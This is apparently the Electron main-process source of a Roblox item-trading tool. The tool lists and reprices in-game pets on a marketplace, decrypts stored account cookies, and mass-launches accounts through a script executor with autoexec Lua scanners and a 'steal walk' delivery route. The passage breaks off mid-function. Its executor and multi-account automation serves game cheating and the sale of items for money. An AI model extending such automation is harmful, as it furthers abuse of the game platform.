const { app, BrowserWindow, ipcMain, shell, session, desktopCapturer, dialog, nativeImage, net } = require('electron');
const path = require('path');
const fs = require('fs');

const { Store, rid, DEFAULT_DELIVERY_STEPS } = require('./src/main/store');
const { Bridge, PARTITION, ORIGIN } = require('./src/main/bridge');
const { Eldorado, listOf } = require('./src/main/eldorado');
const sab = require('./src/main/sab');
const { smartPrice } = require('./src/main/pricing');
const { AutoLister } = require('./src/main/autolist');
const { Repricer, Watcher, reconcileListed, discord, robloxUser, robloxAvatar } = require('./src/main/services');
const { Delivery } = require('./src/main/delivery');
const { startLocalServer } = require('./src/main/localserver');
const { checkUpdate, installUpdate } = require('./src/main/updater');
const webmfix = require('./src/main/webmfix');
const { LegitRoblox } = require('./src/main/legitroblox');
const baseroute = require('./src/main/baseroute');
const { Launcher, decryptCookie } = require('./src/main/launcher');
const { Art } = require('./src/main/art');
const { Wiki } = require('./src/main/wiki');

const SMOKE = process.argv.includes('--smoke');

// One-time move from the old app name: %APPDATA%\Meowl Lister -> %APPDATA%\Zotac Lister. The whole
// folder moves (data file, art cache, and Chromium's Local State that holds the safeStorage key,
// so saved Roblox cookies still decrypt). Must run before anything opens the new folder.
if (!SMOKE) {
  try {
    const oldDir = path.join(app.getPath('appData'), 'Meowl Lister');
    const newDir = app.getPath('userData');
    if (fs.existsSync(oldDir) && oldDir !== newDir) {
      if (!fs.existsSync(newDir)) fs.renameSync(oldDir, newDir);
      else if (!fs.existsSync(path.join(newDir, 'zotac-data.json'))) fs.cpSync(oldDir, newDir, { recursive: true, force: true });
    }
    const oldFile = path.join(newDir, 'meowl-data.json'), newFile = path.join(newDir, 'zotac-data.json');
    if (fs.existsSync(oldFile) && !fs.existsSync(newFile)) fs.renameSync(oldFile, newFile);
  } catch (e) { console.error('data folder migration failed:', e.message); }
}
if (!SMOKE && !app.requestSingleInstanceLock()) app.quit();

let win = null;
let appInfoRate;   // % of the last 200 Eldorado requests that succeeded (footer)
let store, bridge, eld, lister, repricer, watcher, delivery, launcher, art, wiki;
const proofDir = () => { const d = path.join(app.getPath('userData'), 'proofs'); fs.mkdirSync(d, { recursive: true }); return d; };

const send = (ch, payload) => { if (win && !win.isDestroyed()) win.webContents.send(ch, payload); };
// latest scan per Roblox server (job id), newest 5 kept, in memory only
const serverScans = {};
function saveServerScan(d) {
  const id = String(d.jobId || d.by || 'server');
  serverScans[id] = { ...d, jobId: id, receivedAt: Date.now() };
  // slot counts of saved accounts' bases (every server scan has them)
  let slotsChanged = false;
  for (const b of d.bases || []) {
    const a = b.owner && Number(b.slots) > 0 && store.get('accounts').find(x => x.username.toLowerCase() === String(b.owner).toLowerCase());
    if (a && Number(b.slots) > (Number(a.slots) || 0)) { a.slots = Number(b.slots); slotsChanged = true; }   // far bases stream in partly: keep the highest count seen
    if (a && b.rebirths != null && a.rebirths !== Number(b.rebirths)) { a.rebirths = Number(b.rebirths); slotsChanged = true; }
  }
  if (slotsChanged) store.save();
  const ids = Object.keys(serverScans).sort((a, b) => serverScans[b].receivedAt - serverScans[a].receivedAt);
  for (const old of ids.slice(5)) delete serverScans[old];
  send('server:scan', { jobId: id });
}
// Roblox profile pictures for every account: user ids from usernames, then headshots, both in
// batches (one request each for up to 100 accounts). Refreshed daily; new accounts right away.
let avatarTimer = null;
function refreshAvatarsSoon(ms = 1500) { clearTimeout(avatarTimer); avatarTimer = setTimeout(() => refreshAvatars().catch(e => store.log('warn', '[Avatars] ' + e.message)), ms); }
async function refreshAvatars() {
  const accts = store.get('accounts');
  const stale = accts.filter(a => a.username && (!a.avatar || Date.now() - (a.avatarAt || 0) > 24 * 3600e3));
  if (!stale.length) return;
  const needId = stale.filter(a => !a.robloxUserId).slice(0, 100);
  if (needId.length) {
    const r = await fetch('https://users.roblox.com/v1/usernames/users', { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ usernames: needId.map(a => a.username), excludeBannedUsers: false }), signal: AbortSignal.timeout(20000) });
    if (r.ok) for (const u of (await r.json()).data || []) {
      const a = needId.find(x => x.username.toLowerCase() === String(u.requestedUsername || u.name).toLowerCase());
      if (a) { a.robloxUserId = u.id; a.displayName = a.displayName || u.displayName; }
    }
  }
  const withId = stale.filter(a => a.robloxUserId).slice(0, 100);
  if (!withId.length) return store.save();
  const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${withId.map(a => a.robloxUserId).join(',')}&size=150x150&format=Png&isCircular=false`, { signal: AbortSignal.timeout(20000) });
  if (r.ok) for (const t of (await r.json()).data || []) {
    const a = withId.find(x => String(x.robloxUserId) === String(t.targetId));
    if (a && t.imageUrl && t.state === 'Completed') { a.avatar = t.imageUrl; a.avatarAt = Date.now(); }
  }
  store.save(); send('pets:changed');
}
// --- Auto Scan -------------------------------------------------------------
// Opens the chosen logged-in accounts in batches (into the private server); the scanner in
// autoexec imports each base as soon as it loads, then that account's Roblox is closed and the
// next batch starts. An account that does not report within the time limit counts as failed.
const autoScan = {
  running: false, stopFlag: false, total: 0, done: 0, failed: 0, current: [], log: [],
  waiters: {},
  hostId: null, waitSince: {}, joinAt: {}, opened: new Set(), failedList: [], batch: 3,
  SCAN_LIMIT: 45000,   // an account not scanned this long after its launch counts as failed (retry from the popup)
  fail(a, why) { this.failed++; if (!this.failedList.some(f => f.id === a.id)) this.failedList.push({ id: a.id, username: a.username, why }); },
  say(msg, level = 'info') { this.log.push({ t: Date.now(), msg, level }); if (this.log.length > 300) this.log.shift(); store.log(level, '[AutoScan] ' + msg); this.emit(); },
  state() { return { running: this.running, total: this.total, done: this.done, failed: this.failed, failedList: this.failedList, current: this.current, log: this.log, batch: (store.get('settings').autoscan || {}).batch || 3, ids: (store.get('settings').autoscan || {}).ids || null }; },
  emit() { send('autoscan', this.state()); },
  onImport(username, r, count, noGen = 0) {
    if (r && r.incomplete) return;   // half-loaded base: keep waiting for the real scan
    const k = String(username || '').toLowerCase();
    const w = this.waiters[k];
    if (w) { delete this.waiters[k]; w({ ok: true, noGen, count: count != null ? count : (r && r.added) || 0 }); }
  },
  host() { return this.hostId ? store.get('accounts').find(x => x.id === this.hostId) || null : null; },
  // an account's own scanner (SCRIPT accounts) may also answer for its own base
  wants(account) { return !!this.waiters[String(account || '').toLowerCase()]; },
  // the scanning account sends a fresh scan of every base in the server while accounts still wait
  wantsServer(account) {
    const h = this.host();
    return !!(this.running && h && h.username.toLowerCase() === String(account || '').toLowerCase() && Object.keys(this.waiters).length);
  },
  // A server scan from the scanning account: every base that belongs to an account this run waits
  // for becomes that account's inventory, once the base is complete (the game's own pet count is
  // reached: a player who just joined streams in for a few seconds).
  onServerScan(d) {
    if (!this.running || !d || !Array.isArray(d.bases)) return;
    for (const b of d.bases) {
      const k = String(b.owner || '').toLowerCase();
      if (!k || !this.waiters[k]) continue;
      // only after this run launched it (or found it in game), and only while that player is in the
      // server: a base can still show a player who left (an old scan once closed a window too early)
      if (!this.joinAt[k] || b.here === false) continue;
      const pets = Array.isArray(b.pets) ? b.pets : [];
      // without the game's count (its data not on the scanning client yet, so no uuids either) a
      // base is only taken after 90 s of waiting
      if (b.expected == null ? (!pets.length || Date.now() - (this.waitSince[k] || 0) < 30000) : pets.length < b.expected) continue;
      const r = importPets({ username: b.owner, userId: b.userId, pets, expected: b.expected, slots: b.slots, traitsKnown: true, remote: true }, null, { replace: true, onlySaved: true });
      if (!r || r.skipped === true || r.incomplete) continue;
      store.log('info', `[Scanner] ${b.owner}: ${r.added} pets synced (server scan by @${d.by})`);
      send('pets:changed');
      this.onImport(b.owner, r, pets.length, pets.filter(p => !(Number(p.gen) > 0)).length);
    }
  },
  // the account that scans the server: a SCRIPT account (in game first, then one chosen for this run,
  // then any logged-in one) - by state, never by name
  pickHost(sel = []) {
    const cands = store.get('accounts').filter(x => !x.legit && x.cookieEnc && x.username);
    return cands.find(x => launcher.isOnline(x)) || cands.find(x => sel.includes(x.id)) || cands[0] || null;
  },
  async start({ ids, batch } = {}) {
    if (this.running) return this.state();
    ids = Array.isArray(ids) ? ids : [];
    const accts = store.get('accounts').filter(a => ids.includes(a.id) && a.cookieEnc);
    batch = Math.max(1, Math.min(10, Number(batch) || 3));
    store.patchSettings({ autoscan: { batch, ids } });
    if (!accts.length) { this.say('No logged-in accounts selected', 'warn'); return this.state(); }
    if (!String((store.get('settings').launcher || {}).privateServer || '').trim()) { this.say('No private server link set - Auto Scan never opens accounts in a public server', 'error'); return this.state(); }
    if ((store.get('settings').scanner || {}).autoexec === false) { this.say('Auto Scanner is off, so the scanner is not in autoexec and the scanning account would never scan. Turn on Auto Scanner (Roblox Accounts) first.', 'error'); return this.state(); }
    if (!lastAutoexec.some(f => /zotac_scanner\.lua$/i.test(f))) syncAutoexec();
    const host = this.pickHost(ids);
    if (!host) { this.say('Auto Scan needs one logged-in account in SCRIPT mode: it joins with the chosen accounts and scans the whole server (Roblox Accounts → SCRIPT)', 'error'); return this.state(); }
    Object.assign(this, { running: true, stopFlag: false, total: accts.length, done: 0, failed: 0, failedList: [], batch, current: [], waiters: {}, waitSince: {}, joinAt: {}, opened: new Set(), hostId: host.id });
    this.say(`Started: ${accts.length} account(s), ${batch} per batch - @${host.username} scans the server`);
    (async () => {
      try {
        if (await this.ensureHost(host)) {
          const others = accts.filter(a => a.id !== host.id);
          if (accts.some(a => a.id === host.id)) await this.batchOf([host], 'Scanning account');
          for (let i = 0; i < others.length && !this.stopFlag; i += batch) await this.batchOf(others.slice(i, i + batch), `Batch ${i / batch + 1}`);
        } else {
          for (const a of accts) this.fail(a, `the scanning account @${host.username} never got into the game`);
        }
      } catch (e) { this.say('Auto Scan stopped: ' + e.message, 'error'); }
      this.say(this.stopFlag ? 'Stopped' : `Finished: ${this.done} scanned, ${this.failed} failed`);
      this.running = false; this.current = []; this.waiters = {}; this.emit();
      // every window this run opened is closed (the scanning account too), checked one by one
      await this.closeOpened().catch(e => this.say('Closing the windows: ' + e.message, 'error'));
      send('pets:changed');
      // accounts that did not launch / were not scanned: a popup offers to retry just those
      if (!this.stopFlag && this.failedList.length) send('autoscan:failed', { accounts: this.failedList, batch: this.batch });
    })();
    return this.state();
  },
  // the scanning account in the private server with its scripts running (it stays for the whole run)
  async ensureHost(host) {
    if (launcher.isOnline(host)) return true;
    try {
      const r = await launcher.launch(host.id, {});
      if (!r || !r.skipped) this.opened.add(host.id);
      this.say(`@${host.username}: ${r && r.skipped ? r.skipped : 'launched'} - waiting for its scripts`);
    } catch (e) { this.say(`@${host.username}: ${e.message}`, 'error'); return false; }
    for (let i = 0; i < 90 && !this.stopFlag; i++) {
      if (launcher.isOnline(host)) return true;
      await new Promise(r => setTimeout(r, 2000));
    }
    if (!this.stopFlag) this.say(`@${host.username}: its scripts never talked to Zotac in 3 minutes (is zotac_scanner.lua in its executor's autoexec?)`, 'error');
    return false;
  },
  async batchOf(group, label) {
    this.current = group.map(a => a.username);
    this.say(`${label}: ${this.current.map(u => '@' + u).join(', ')}`);
    await Promise.all(group.map((a, j) => this.scanOne(a, j * 2000)));
  },
  async scanOne(a, delay) {
    await new Promise(r => setTimeout(r, delay));
    if (this.stopFlag) return;
    const k = a.username.toLowerCase();
    const isHost = a.id === this.hostId;
    if (isHost) this.joinAt[k] = Date.now();
    this.waitSince[k] = Date.now();
    // the 45 s count from the launch, not from queueing (the launch itself can take a few seconds)
    let res0;
    const result = new Promise(res => { this.waiters[k] = res; res0 = res; });
    const arm = () => setTimeout(() => { if (this.waiters[k] === res0) { delete this.waiters[k]; res0({ ok: false, why: `not scanned within ${this.SCAN_LIMIT / 1000} s (did it launch and join the private server?)` }); } }, this.SCAN_LIMIT);
    if (isHost) arm();
    let opened = false;
    if (!isHost) {
      try {
        // Legit = real Roblox without the executor (Zotac never opens a Legit account with it)
        const r = await launcher.launch(a.id, { legit: !!a.legit });
        opened = !(r && r.skipped);
        if (opened) this.opened.add(a.id);
        this.joinAt[k] = Date.now();
        arm();
        this.say(`@${a.username}: ${opened ? (a.legit ? 'opened with real Roblox (Legit)' : 'launched') : 'already in game'}, waiting for its base in the server scan`);
      } catch (e) { if (this.waiters[k]) delete this.waiters[k]; this.fail(a, 'did not launch: ' + e.message); this.say(`@${a.username}: ${e.message}`, 'error'); return; }
    }
    const r = await result;
    if (r.ok) { this.done++; this.say(`@${a.username}: scanned (${r.count} pets)${r.noGen ? ` - ${r.noGen} without gen/s (name tag out of range; a pet Zotac knew keeps its gen/s)` : ''}`); }
    else { if (r.why !== 'stopped') this.fail(a, r.why); else this.failed++; this.say(`@${a.username}: ${r.why}`, 'warn'); }
    // only the windows Auto Scan opened, and never one that is busy with a delivery job
    const busy = () => store.get('jobs').some(j => j.accountId === a.id && ['pending', 'running'].includes(j.status));
    if (opened) setTimeout(() => this.closeOne(a), 1500);
  },
  // close a window this run opened (never one busy with a delivery job); waits for its process to be
  // known when it was launched a moment ago
  async closeOne(a) {
    if (store.get('jobs').some(j => j.accountId === a.id && ['pending', 'running'].includes(j.status))) { this.opened.delete(a.id); this.say(`@${a.username}: kept open, it has a delivery job`); return; }
    const st = await launcher.closeGame(a.username, { waitPid: 30000, detail: true }).catch(() => 'stuck');
    if (st === true || st === 'closed' || st === 'gone') this.opened.delete(a.id);
  },
  // end of the run: everything still open that this run opened, again, until none is left
  async closeOpened() {
    for (let round = 0; round < 3 && this.opened.size; round++) {
      for (const id of [...this.opened]) {
        const a = store.get('accounts').find(x => x.id === id);
        if (!a) { this.opened.delete(id); continue; }
        await this.closeOne(a);
      }
    }
    if (this.opened.size) this.say(`Could not close: ${[...this.opened].map(id => '@' + ((store.get('accounts').find(x => x.id === id) || {}).username || id)).join(', ')} - close it by hand`, 'error');
    else this.say('All windows Auto Scan opened are closed');
  },
  stop() { this.stopFlag = true; for (const k of Object.keys(this.waiters)) { const w = this.waiters[k]; delete this.waiters[k]; w({ ok: false, why: 'stopped' }); } this.say('Stopping...'); return this.state(); }
};

const updateHooks = {
  log: msg => store.log('info', msg),
  onDone: sha => { if (sha) store.patchSettings({ autoUpdate: { installedSha: sha } }); }
};

// --- renderer round-trip (image generation runs on a canvas in the UI) ------
const pending = new Map();
function rendererCall(name, payload, timeout = 20000) {
  return new Promise((resolve, reject) => {
    if (!win || win.isDestroyed()) return reject(new Error('UI not available'));
    const id = rid(6);
    const t = setTimeout(() => { pending.delete(id); reject(new Error(name + ' timed out')); }, timeout);
    pending.set(id, { resolve, reject, t });
    win.webContents.send('rcall', { id, name, payload });
  });
}
ipcMain.on('rcall:result', (_e, { id, ok, value, error }) => {
  const p = pending.get(id); if (!p) return;
  clearTimeout(p.t); pending.delete(id);
  ok ? p.resolve(value) : p.reject(new Error(error));
});

function localPetImage(folder, name) {
  if (!folder) return null;
  try {
    const want = sab.norm(name);
    const f = fs.readdirSync(folder).find(x => /\.(png|jpe?g|webp)$/i.test(x) && sab.norm(x.replace(/\.[^.]+$/, '')) === want);
    if (!f) return null;
    const ext = f.split('.').pop().toLowerCase().replace('jpg', 'jpeg');
    return `data:image/${ext};base64,` + fs.readFileSync(path.join(folder, f)).toString('base64');
  } catch { return null; }
}

// Pet art: your image folder first, else the picture taken from the game (scanner art ids).
async function artFor(pet, imageFolder) {
  // image folder > the wiki's picture > the game's own picture / 3D model render
  const petArt = localPetImage(imageFolder, pet.name) || await wiki.picture(pet.name) || await art.petPicture(pet.name, pet.mutation);
  const traitArt = await Promise.all((pet.traits || []).slice(0, 6).map(async t => ({ name: t, url: await art.dataUrl('traits', t) })));
  const mut = pet.mutation && !/^(none|normal)$/i.test(pet.mutation) ? pet.mutation : null;
  const mutationArt = mut ? { name: mut, url: await art.dataUrl('mutations', mut) } : null;
  return { art: petArt, traitArt, mutationArt };
}
async function renderImage({ pet, rarity, imageFolder }) {
  const a = await artFor(pet, imageFolder);
  const al = store.get('settings').autolist || {};
  const dataUrl = await rendererCall('renderImage', { pet, rarity, ...a, shopName: al.shopName || '', recolor: al.recolorByMutation !== false });
  return dataUrl ? String(dataUrl).split(',')[1] : null;
}

function createWindow() {
  win = new BrowserWindow({
    width: 1440, height: 900, minWidth: 1100, minHeight: 680,
    frame: false, backgroundColor: '#0d0b08', show: !SMOKE,
    icon: path.join(__dirname, 'assets', 'icon.png'),
    webPreferences: { preload: path.join(__dirname, 'preload.js'), contextIsolation: true, webviewTag: true, sandbox: false, backgroundThrottling: false }
  });
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
  win.webContents.setWindowOpenHandler(({ url }) => { if (/^https:\/\//.test(url)) shell.openExternal(url); return { action: 'deny' }; });
  // the hidden eldorado.gg window kept the app alive with no way back to it: closing the main window quits
  win.on('close', e => {
    if (SMOKE || !store || !deliveryJobsActive()) return;
    const r = dialog.showMessageBoxSync(win, { type: 'warning', buttons: ['Keep open', 'Quit anyway'], defaultId: 0, cancelId: 0, title: 'Zotac Lister', message: 'A delivery is running.', detail: 'Quitting stops the delivery until you start Zotac again.' });
    if (r === 0) e.preventDefault();
  });
  win.on('closed', () => { win = null; if (!SMOKE) app.quit(); });
}

// Screen recording for Video Proof: the Roblox window of the account doing the trade (set by
// proof:target from the process Zotac launched for it), else the first Roblox window, else the screen.
let captureHwnd = null;
let captureStrict = false;   // the next capture must be exactly that window
// every visible Roblox game window: { pid, hwnd, path } (top-level windows titled "Roblox", each
// with its own process; MainWindowHandle alone came back empty for a game that was open)
const ROBLOX_WINDOWS_PS = "Add-Type @\"\nusing System; using System.Text; using System.Runtime.InteropServices;\npublic class ZW {\n  public delegate bool P(IntPtr h, IntPtr l);\n  [DllImport(\"user32.dll\")] public static extern bool EnumWindows(P f, IntPtr l);\n  [DllImport(\"user32.dll\")] public static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);\n  [DllImport(\"user32.dll\")] public static extern bool IsWindowVisible(IntPtr h);\n  [DllImport(\"user32.dll\", CharSet = CharSet.Unicode)] public static extern int GetWindowText(IntPtr h, StringBuilder s, int n);\n  public static string List() {\n    var sb = new StringBuilder();\n    EnumWindows((h, l) => { uint p; GetWindowThreadProcessId(h, out p); var t = new StringBuilder(256); GetWindowText(h, t, 256);\n      if (IsWindowVisible(h) && t.ToString().Contains(\"Roblox\")) sb.AppendLine(p + \"|\" + h.ToInt64()); return true; }, IntPtr.Zero);\n    return sb.ToString();\n  }\n}\n\"@\n[ZW]::List() -split \"`n\" | Where-Object { $_ -match \"\\|\" } | ForEach-Object { $a = $_.Trim().Split(\"|\"); $p = Get-Process -Id $a[0] -ErrorAction SilentlyContinue; $a[0] + \"|\" + $a[1] + \"|\" + ($p.Path) }";
function robloxWindows() {
  return new Promise(res => require('child_process').execFile('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', ROBLOX_WINDOWS_PS],
    { windowsHide: true, timeout: 15000 }, (err, out) => {
      if (err) return res([]);
      res(String(out || '').split(/\r?\n/).map(l => l.trim().split('|')).filter(a => a.length >= 2 && Number(a[0]) && Number(a[1]))
        .map(a => ({ pid: Number(a[0]), hwnd: Number(a[1]), path: a.slice(2).join('|') })));
    }));
}
// the window of the game Zotac opened for this account; retried while the window comes up.
// Without the account's own process: the one Roblox window that is not a Legit (stock account)
// client and not another account's game. Never a guess between several.
async function windowOfAccount(acctId) {
  const legitDir = launcher.legit && launcher.legit.dir ? String(launcher.legit.dir).toLowerCase() : null;
  for (let i = 0; i < 5; i++) {
    const wins = await robloxWindows();
    const pid = launcher.pids[acctId];
    const own = pid && wins.find(w => w.pid === pid);
    if (own) return own.hwnd;
    const others = new Set(Object.entries(launcher.pids).filter(([id]) => id !== acctId).map(([, p]) => p));
    const cands = wins.filter(w => /RobloxPlayerBeta\.exe$/i.test(w.path || '') && !others.has(w.pid) && !(legitDir && String(w.path || '').toLowerCase().startsWith(legitDir)));
    if (!pid && cands.length === 1) return cands[0].hwnd;
    await new Promise(r => setTimeout(r, 1500));
  }
  return null;
}
function setupCapture() {
  session.defaultSession.setDisplayMediaRequestHandler(async (_req, cb) => {
    const sources = await desktopCapturer.getSources({ types: ['window', 'screen'] });
    const mine = captureHwnd ? sources.find(s => s.id.startsWith('window:' + captureHwnd + ':')) : null;
    const strict = captureStrict;
    captureHwnd = null; captureStrict = false;
    // a delivery clip is the trading account's own window or nothing (never another account's game)
    if (strict && !mine) { cb({}); return; }
    const pick = mine || sources.find(s => /roblox/i.test(s.name)) || sources.find(s => s.id.startsWith('screen')) || sources[0];
    cb({ video: pick });
  });
}

function wire() {
  store = new Store(app.getPath('userData'));
  // pets pasted as JSON on Auto List stay (also over a restart) until they are listed or removed;
  // only unlisted pets that belong to no account and were not added by hand are dropped
  { const before = store.get('pets').length; store.set('pets', store.get('pets').filter(p => !(p.status === 'available' && !p.accountId && !p.manual))); if (store.get('pets').length !== before) store.save(); }
  // and the accounts such a paste created, once nothing points at them (no pets, cookie or note)
  { const used = new Set(store.get('pets').map(p => p.accountId)); const before = store.get('accounts').length;
    store.set('accounts', store.get('accounts').filter(a => !(a.session && !used.has(a.id) && !a.cookieEnc && !a.note)));
    if (store.get('accounts').length !== before) store.save(); }
  // 1.23.9: the auto-repricer is switched on with the seller's chosen settings, once per data file
  // (repricer.preset marks it done, so changes made after that are kept). Not in the store
  // defaults on purpose: a default preset would hide this from data files saved before it existed.
  if (!(store.data.settings.repricer || {}).preset) {
    store.patchSettings({ repricer: { enabled: true, intervalMin: 20, undercut: 0.01, floorPct: 70, maxDropPct: 15, onlyIfBeaten: false, scope: 'all', preset: 1 }, rules: { lowballPct: 40 } });
  }
  // backfill new step templates for older data files
  store.data.settings.delivery.steps = { ...DEFAULT_DELIVERY_STEPS, ...store.data.settings.delivery.steps };
  art = new Art({
    store, dir: path.join(app.getPath('userData'), 'art'),
    getCookie: () => { const a = store.get('accounts').find(x => x.cookieEnc); return a ? decryptCookie(a.cookieEnc) : null; },
    render: payload => rendererCall('renderModel', payload, 90000)
  });
  wiki = new Wiki({ dir: path.join(app.getPath('userData'), 'art'), log: (lvl, msg) => store.log(lvl, msg), bundled: path.join(__dirname, 'assets', 'wiki-map.json'),
    // Chromium's network stack first (system proxy / certificates like a browser), Node's as fallback
    fetch: async (url, opts) => { if (net.fetch) { try { return await net.fetch(url, opts); } catch { /* fall back */ } } return fetch(url, opts); } });
  bridge = new Bridge();
  eld = new Eldorado(bridge, store);
  lister = new AutoLister({ store, eld, renderImage });
  repricer = new Repricer({ store, eld });
  watcher = new Watcher({ store, eld });
  delivery = new Delivery({ store, eld, bridge });
  launcher = new Launcher({ store, delivery });
  // real Roblox for Legit mode, in its own folder (never the executor's patched install)
  launcher.legit = new LegitRoblox({ dir: path.join(process.env.LOCALAPPDATA || app.getPath('userData'), 'Zotac Lister', 'LegitRoblox'), log: (lvl, msg) => store.log(lvl, msg) });
  launcher.legit.on('progress', p => send('legit:progress', p));
  launcher.on('launched', () => send('launcher:changed'));
  delivery.on('job', j => { syncDeliveryAutoexec(); launcher.onJob(j); });

  // Security mode: the stock account a steal takes from is opened with real Roblox (never the
  // executor) and closed again afterwards, only when Zotac opened it for that
  // the recorded way into a base for the steal walk (userData/base-route.json wins over the bundled one)
  const route = baseroute.load(app.getPath('userData'));
  delivery.baseRoute = () => route;
  delivery.hosts = {
    open: async id => {
      const a = store.get('accounts').find(x => x.id === id);
      if (!a) throw new Error('account not found');
      if (!(store.get('settings').launcher || {}).autoLaunch) { send('toast', { text: `Security mode: open @${a.username} with ▶ Start (Legit) now, Auto-launch is off`, kind: 'error' }); return; }
      await launcher.launch(id, { legit: true });
    },
    // only a game Zotac opened with real Roblox (its process is known, also after a restart)
    close: async id => {
      const a = store.get('accounts').find(x => x.id === id);
      if (a && launcher.mode[id] === 'legit' && launcher.pids[id]) await launcher.closeGame(a.username);
    }
  };
  // a delivery that failed closes the games Zotac opened for it (script and stock account); a game
  // Zotac did not launch has no known process and is left alone
  delivery.games = {
    close: async id => {
      const a = store.get('accounts').find(x => x.id === id);
      return !!(a && launcher.pids[id]) && launcher.closeGame(a.username);
    }
  };
  // no private server link: nothing is launched; the job waits (you can still join and run the
  // script yourself) and the app tells you why
  launcher.on('launchBlocked', ({ reason }) => send('toast', { text: reason, kind: 'error' }));
  // a game a delivery needs crashed / froze / errored: its job starts over on a fresh launch
  launcher.on('crashed', c => { send('toast', { text: `@${c.username}: Roblox ${c.why} - opening it again`, kind: 'error' }); delivery.accountCrashed(c); });

  bridge.on('state', s => send('bridge:state', s));
  const reqs = [];
  bridge.on('request', r => { reqs.push(r.status >= 200 && r.status < 300 ? 1 : 0); if (reqs.length > 200) reqs.shift(); appInfoRate = reqs.length ? 100 * reqs.reduce((a, b) => a + b, 0) / reqs.length : undefined; });
  for (const em of [lister, repricer, delivery, launcher]) em.on('log', e => send('log', e));
  lister.on('progress', p => send('autolist:progress', p));
  lister.on('pets', () => send('pets:changed'));
  repricer.on('done', r => send('repricer:done', r));
  watcher.on('sale', ({ order, pets }) => { send('sale', order); send('pets:changed'); delivery.onSale(order, pets); });
  watcher.on('orderCancelled', o => { if (delivery.orderCancelledRemote(o.id)) send('pets:changed'); });
  watcher.on('dispute', o => send('dispute', o));
  watcher.on('notification', n => send('notification', n));
  watcher.on('unread', (n) => send('unread', n));
  watcher.on('orders', rows => send('orders', rows));
  delivery.on('update', d => send('delivery:update', d));
  delivery.on('job', j => send('delivery:job', j));
  delivery.on('petsChanged', () => send('pets:changed'));
  delivery.on('trade', e => send('trade', e));
  delivery.on('message', m => send('talk:message', m));
  watcher.sendChat = (orderId, text) => delivery.chat(orderId, text);
  // public picture URL of a brainrot (SAB wiki) for Discord cards
  delivery.petImageUrl = async name => ((await wiki.index()) || {})[sab.norm(name)] || null;
  delivery.on('proof', p => send('proof', p));
  ipcMain.on('bridge:event', (_e, { type, payload }) => { if (type === 'talk:message') delivery.onMessage(payload); });

  try { syncAutoexec(); } catch (e) { store.log('warn', '[Autoexec] ' + e.message); }
  try { dedupeUuids(); } catch (e) { store.log('warn', '[Scanner] uuid check: ' + e.message); }
  setTimeout(() => { for (const j of store.get('jobs')) if (j.status === 'pending' && Date.now() - (j.createdAt || 0) < 10 * 60000) launcher.onJob(j); }, 8000);
  startLocalServer({ store, bridge, delivery, wantRescan: acc => autoScan.wants(acc), wantServer: acc => autoScan.wantsServer(acc), onServerScan: d => { saveServerScan(d); autoScan.onServerScan(d); }, onArt: a => { try { art.remember(a); } catch (e) { store.log('warn', '[Scanner] art: ' + e.message); } }, onAgentClosing: acc => { launcher.markClosing(acc); setTimeout(() => launcher.closeGame(acc).catch(() => {}), 2500); }, onClientError: (acc, msg) => launcher.clientError(acc, msg), importScan: data => { const r = importPets(data, null, { replace: true, onlySaved: true }); if (r.skipped === true) return r; refreshAvatarsSoon(); const noGen = data && data.remote && Array.isArray(data.pets) ? data.pets.filter(p => !(Number(p.gen) > 0)).length : 0; autoScan.onImport(data && data.username, r, data && Array.isArray(data.pets) ? data.pets.length : null, noGen); send('pets:changed'); store.log('info', `[Scanner] ${data && data.username}: ${r.added} pets synced`); return r; }, onCookies: () => { send('auth:changed'); afterLogin(); } });
}

// one offer check at a time; the Auto List / Listings pages ask for one when they open
let reconRunning = null;
function reconListed() {
  if (reconRunning) return reconRunning;
  reconRunning = reconcileListed(eld, store).then(n => { if (n) send('pets:changed'); return n; })
    .catch(e => { store.log('warn', '[Listings] offer check: ' + e.message); return 0; })
    .finally(() => { reconRunning = null; });
  return reconRunning;
}

async function afterLogin() {
  try {
    await eld.me(true);
    send('auth:changed');
    watcher.start();
    repricer.schedule();
    clearInterval(afterLogin.recon); afterLogin.recon = setInterval(reconListed, 3 * 60000); setTimeout(reconListed, 20000);
    if (store.get('settings').delivery.enabled) delivery.ensureTalk();
  } catch { /* not logged in yet */ }
}

// Import pets from any supported JSON. replace=true (plot scanner sync) first drops the
// account's still-available pets, so a rescan does not duplicate them.
// Scans before 1.22.9 could give many different pets one uuid (a fixed model attribute of some
// brainrots), and "same uuid = same pet" then swapped their data on rescans. A uuid held by more
// than one stored pet is removed from all of them (they match by name/mutation/gen/traits again).
function dedupeUuids() {
  const by = {};
  for (const p of store.get('pets')) if (p.uuid) (by[p.uuid] = by[p.uuid] || []).push(p);
  let n = 0;
  for (const list of Object.values(by)) if (list.length > 1) for (const p of list) { delete p.uuid; n++; }
  for (const j of store.get('jobs')) for (const jp of j.pets || []) if (jp.uuid && (by[jp.uuid] || []).length > 1) delete jp.uuid;
  if (n) { store.log('info', `[Scanner] ${n} pets shared a uuid with another pet - uuid cleared, they match by name/mutation/gen again`); store.save(); }
  return n;
}
function importPets(json, accountId, { replace = false, onlySaved = false } = {}) {
  const raw = typeof json === 'string' ? JSON.parse(json) : json;
  // a scan taken before the base finished loading: pets missing, keep what we have
  if (replace && raw && Array.isArray(raw.pets) && !raw.pets.length && raw.expected > 0) {
    store.log('warn', `[Scanner] ${raw.username}: base still loading (0/${raw.expected} pets) - not imported`);
    return { added: 0, removed: 0, incomplete: true };
  }
  if (replace && raw && Array.isArray(raw.pets) && !raw.pets.length && raw.expected == null) {
    const acct = store.get('accounts').find(a => a.username.toLowerCase() === String(raw.username || '').toLowerCase());
    if (acct && store.get('pets').some(p => p.accountId === acct.id && p.status === 'available')) {
      store.log('warn', `[Scanner] ${raw.username}: scan found 0 pets but the game did not confirm the base is empty - kept the old list`);
      return { added: 0, removed: 0, incomplete: true };
    }
  }
  if (raw && raw.art) art.remember(raw.art);
  const accounts = store.get('accounts');
  // the Auto Scanner only syncs a base into an account that is already saved in Roblox Accounts
  if (replace && onlySaved && raw && raw.username && !accounts.some(a => a.username.toLowerCase() === String(raw.username).toLowerCase())) {
    if (!importPets.warned) importPets.warned = new Set();
    const k = String(raw.username).toLowerCase();
